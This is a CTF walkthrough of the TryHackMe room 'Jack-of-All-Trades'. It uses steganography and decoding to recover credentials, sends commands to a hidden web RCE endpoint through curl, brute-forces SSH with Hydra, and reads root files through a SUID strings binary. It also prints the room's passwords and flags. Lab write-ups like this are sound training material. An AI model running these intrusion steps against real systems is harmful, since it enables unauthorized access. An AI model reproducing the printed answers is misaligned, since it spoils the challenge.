# 🛡️ TryHackMe – Jack-of-All-Trades - Writeup

## 📌 Overview
**Room Name:** Jack-of-All-Trades  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web / Steganography / Brute Force / PrivEsc

Deliberately misconfigured Linux machine with SSH on port 80 and HTTP on port 22. Layered steganography and multi-stage encoding yield credentials, a hidden RCE endpoint provides a password list for SSH brute-force, and a SUID `strings` binary reads the root flag directly.

Attack chain overview:

- HTTP on port 22 (non-standard) — source reveals Base64 password and `/recovery.php` hint
- Steganography on `header.jpg` with recovered passphrase → CMS credentials
- `stego.jpg` extraction → triple-encoded (Base32 → Hex → ROT13) hint confirming credential location
- `recovery.php` login → session cookie handling → hidden RCE endpoint `/nnxhweOV/index.php`
- RCE reads `/home/jacks_password_list` → Hydra SSH brute-force → `jack`
- User flag visually embedded in `user.jpg`; root flag via SUID `strings` on `/root/root.txt`

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -r 1-65535 -- -sV -sC
```

```text
22/tcp open  http    Apache httpd 2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5
```

SSH and HTTP are **swapped** from their standard ports. Browsers block direct access to port 22 as a security measure, so the web page must be retrieved with `curl`:

```bash
curl http://<TARGET_IP>:22/
```

---

## 🔍 2. Source Code Analysis

The HTML source contained two key items hidden in comments:

**Hidden admin page:**
```html
<!-- Note to self - If I ever get locked out I can get back in at /recovery.php! -->
```

**Base64-encoded string:**
```bash
echo 'UmVtZW1iZXIgdG8gd2lzaCBKb2....' | base64 -d
# → Remember to wish Johny Graves well with his crypto jobhunting!
#   His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

Password candidate recovered: **`u?WtKSraq`**

The page also referenced three images: `stego.jpg`, `header.jpg`, `jackinthebox.jpg`.

---

## 🔬 3. Steganography

### 🖼️ header.jpg → CMS Credentials

```bash
steghide info header.jpg
# → embedded file: "cms.creds" (93 bytes, encrypted rijndael-128)

steghide extract -sf header.jpg -p "u?WtKSraq"
cat cms.creds
```

```text
Here you go Jack. Good thing you thought ahead!
Username: jackinthebox
Password: TplFxiSHjY
```

### 🖼️ stego.jpg → Triple-Encoded Hint

Despite the name suggesting a primary target, `stego.jpg` turned out to contain a hint rather than credentials. Extracted content was encoded in three layers:

```bash
# Step 1: Base32 decode
echo '<extracted_string>' | base32 -d

# Step 2: Hex decode
echo '<hex_string>' | xxd -r -p

# Step 3: ROT13 decode
echo '<rot13_string>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

```text
Remember that the credentials to the recovery login are hidden on the homepage!
I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

This confirmed that `u?WtKSraq` (from the Base64 in the HTML source) was the intended passphrase for `header.jpg`.

---

## 🔓 4. Recovery.php — Hidden RCE Endpoint

### 🔐 Login with Session Cookie Handling

```bash
curl http://<TARGET_IP>:22/recovery.php
```

The page presented a login form. Submitting credentials without preserving cookies caused the session to be lost on redirect:

> **Why cookies matter here:** A successful login sets a `PHPSESSID` cookie. `curl` without `-c`/`-b` flags discards it, so the redirected page sees no valid session. The `-L` flag alone follows the redirect but orphans the cookie.

```bash
# Correct approach: save and reuse cookies
curl -c cookies.txt -b cookies.txt \
  -X POST http://<TARGET_IP>:22/recovery.php \
  -d "user=jackinthebox&pass=TplFxiSHjY"
```

Response headers revealed a redirect to `/nnxhweOV/index.php`.

### 💀 RCE Confirmation

```bash
curl -b cookies.txt \
  "http://<TARGET_IP>:22/nnxhweOV/index.php?cmd=whoami"
# → www-data
```

**RCE confirmed as `www-data`.** ✅

### 📋 Password List Extraction

```bash
curl -b cookies.txt \
  "http://<TARGET_IP>:22/nnxhweOV/index.php?cmd=ls+/home"
# → jack
#   jacks_password_list

curl -b cookies.txt \
  "http://<TARGET_IP>:22/nnxhweOV/index.php?cmd=cat+/home/jacks_password_list" \
  | grep -v "GET me a" > passwords.txt
```

25 password candidates saved.

---

## 🔓 5. SSH Brute Force → Initial Access

Port for SSH is **80** (non-standard). Use `-s` for port with Hydra:

```bash
hydra -l jack -P passwords.txt -s 80 ssh://<TARGET_IP>
# → [80][ssh] login: jack   password: ITMJpGGIqg1jn?>@
```

```bash
ssh jack@<TARGET_IP> -p 80
# Password: ITMJpGGIqg1jn?>@
```

**Initial access as `jack` achieved.** ✅

---

## 🏁 6. User Flag — Visual Steganography

Jack's home directory contained only `user.jpg`. Standard steg tools (`steghide`, `stegseek`, `binwalk`, `strings`) found nothing:

> **Why visual inspection worked:** The flag was not cryptographically hidden — it was rendered as text within the image itself, embedded in a penguin soup recipe illustration. No tool would extract it because it was never encoded; it was simply drawn into the image content.

```bash
scp -P 80 jack@<TARGET_IP>:~/user.jpg .
eog user.jpg
```

Flag visible in the image: **`securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`**

---

## 👑 7. Privilege Escalation: jack → root

### 🔍 Sudo Check

```bash
sudo -l
# → Sorry, user jack may not run sudo on jack-of-all-trades.
```

### 🔎 SUID Binaries

```bash
find / -perm -4000 2>/dev/null
```

```text
/usr/bin/strings   ← unusual SUID
/usr/bin/procmail
/usr/sbin/exim4
```

`strings` with SUID runs as root, allowing it to read any file regardless of permissions.

Cracking the root hash from `/etc/shadow` was considered:

> **Why hash cracking was abandoned:** The shadow file showed `root` using SHA-512crypt (`$6$`), which applies 5,000 iterations by default. After 8+ minutes against `rockyou.txt` with no result, it was clear this wasn't the intended path. SUID `strings` offered a direct read without cracking.

```bash
strings /root/root.txt
```

```text
ToDo:
1. Get new penguin skin rug ...
...
6. Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```

**Root flag obtained without a shell.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}
```

Found visually inside `user.jpg`.

### 👑 Root Flag

```
securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```

Read directly via SUID `strings` on `/root/root.txt`.

---

## 📚 Key Takeaways

- 🔀 **Non-standard port assignments require tool adaptation:** Browsers block port 22 for HTTP. `curl` bypasses the restriction. Hydra needs `-s` (not `-p`) for non-default SSH ports.

- 🍪 **Cookie persistence is required for authenticated curl sessions:** `-L` follows redirects but drops the session. Use `-c cookies.txt -b cookies.txt` to persist cookies across requests, especially when login sets `PHPSESSID`.

- 🔢 **Identify encoding by character set before decoding:** Base32 uses uppercase A–Z and digits 2–7 with `=` padding. Attempting Base64 first produced binary garbage — recognising the character set earlier would have saved the step.

- 🖼️ **Not all hidden flags use crypto — some are just drawn in:** `user.jpg` contained the flag as visible text within the illustration. When all steg tools fail, open the image and look at it.

- 🔑 **SUID on `strings` is a direct file read primitive:** Any file readable by root can be exfiltrated character by character. Hash cracking is slower and noisier; a readable SUID binary is always preferable when available.

- 🎯 **Name-based misdirection is common in CTFs:** `stego.jpg` contained a hint, not the key data. `header.jpg` — the less obviously named file — held the actual credentials. Don't fixate on the most suggestively named asset.

---

## 🛠️ Tools Used

- `rustscan`
- `curl`
- `steghide`
- `stegseek`
- `base64`, `base32`, `xxd`, `tr` (ROT13)
- `hydra`
- `ssh`, `scp`
- `eog` (image viewer)
- `find` (SUID search)
- `strings`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
